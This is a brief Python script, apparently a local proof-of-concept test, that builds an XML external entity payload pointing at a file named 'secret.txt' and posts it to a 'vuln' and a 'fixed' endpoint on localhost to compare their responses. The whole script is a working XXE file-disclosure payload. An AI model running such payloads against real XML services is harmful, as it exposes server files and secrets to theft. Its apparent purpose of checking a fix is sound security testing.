from pathlib import Path
import requests
u=Path("secret.txt").resolve().as_uri();x=f'<!DOCTYPE x [<!ENTITY e SYSTEM "{u}">]><x>&e;</x>'
for p in ("vuln","fixed"):
 r=requests.post("http://127.0.0.1:5000/"+p,data=x);print(p,r.text)

